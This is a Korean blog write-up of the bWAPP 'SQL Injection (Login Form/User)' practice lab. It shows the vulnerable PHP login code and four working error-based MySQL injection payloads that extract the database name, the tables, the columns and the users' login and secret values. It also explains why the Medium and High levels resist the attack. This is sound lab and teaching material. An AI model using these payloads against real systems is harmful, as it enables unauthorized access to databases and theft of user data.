---
layout: single
title: SQL Injection (Login Form/User)
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/sqli-user-archive/sqli-user/image.png)
- Login Form이 존재

![그림 1-2](/assets/image/bwapp/injection/sqli-user-archive/sqli-user/image2.png)
- '(싱글 쿼터) 입력시 DBMS Error가 발생

![그림 1-3](/assets/image/bwapp/injection/sqli-user-archive/sqli-user/image3.png)
- Error 은 발생하였으나, 일반적인 우회는 되지 않음.

### 검증 로직
```php
137         $login = $_POST["login"];
138         $login = sqli($login);
139 
140         $password = $_POST["password"];
141         $password = sqli($password);
142         $password = hash("sha1", $password, false);
143 
144         $sql = "SELECT * FROM users WHERE login = '" . $login . "'";
145 
146         // echo $sql;
147 
148         $recordset = mysql_query($sql, $link);
149 
150         if(!$recordset)
151         {
152 
153             die("Error: " . mysql_error());
154 
155         }
156 
157         else
158         {
159 
160             $row = mysql_fetch_array($recordset);
161 
162             if($row["login"] && $password == $row["password"])
163             {
164 
165                 // $message = "<font color=\"green\">Welcome " . ucwords($row["login"]) . "...</font>";
166                 $message =  "<p>Welcome <b>" . ucwords($row["login"]) . "</b>, how are you today?</p><p>Your secret: <b>" . ucwords($row["secret"        ]) . "</b></p>";
167                 // $message = $row["login"];
168 
169             }
170 
171             else
172             {
173 
174                 $message = "<font color=\"red\">Invalid credentials!</font>";
175 
176             }
```
- 해당 로직을 구현하는 코드이다.
- 입력받는 값을 보게되면 미완성된 SQL 구문에 첫 쿼리 password 없이 login 값만 쿼리에 추가시켜 완성된 구문을 만든다.
- 그 후 DB에 저장되어 있는 password값과 입력한 password값을 비교하고 login 값과 비교 후 맞으면 로그인 된다.
- 해당 로직은 일바적은 SQL Injection 를 통한 인증 우회는 되지 않는다.
- 이 때 153번줄을 보게 되면 DBMS Error을 출력하괴 되므로 Error Based 공격이 가능하다.

```sql
'and (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT schema_name FROM information_schema.schemata LIMIT 1,1), FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
```

![그림 1-4](/assets/image/bwapp/injection/sqli-user-archive/sqli-user/image4.png)

- DB 추출 성공
- 이후 순차적으로 테이블, 컬럼, 데이터를 추출했다.

```sql
'and (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT table_name FROM information_schema.tables where table_schema='bWAPP' LIMIT 3,1), FLOOR(rand(0)*2))a FROM information_schema.tables GROUP BY a LIMIT 0,1)b)--
```

```sql
'and (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT column_name FROM information_schema.columns where table_schema='bWAPP' and table_name='users' LIMIT 1,1), FLOOR(rand(0)*2))a FROM information_schema.columns GROUP BY a LIMIT 0,1)b)--
```

```sql
'and (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT concat(login,0x3a,id,0x3a,secret) from bWAPP.users LIMIT 1,1), FLOOR(rand(0)*2))a FROM information_schema.columns GROUP BY a LIMIT 0,1)b)--
```

![그림 1-5](/assets/image/bwapp/injection/sqli-user-archive/sqli-user/image5.png)
- 성공적으로 데이터를 추출할 수 있다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.

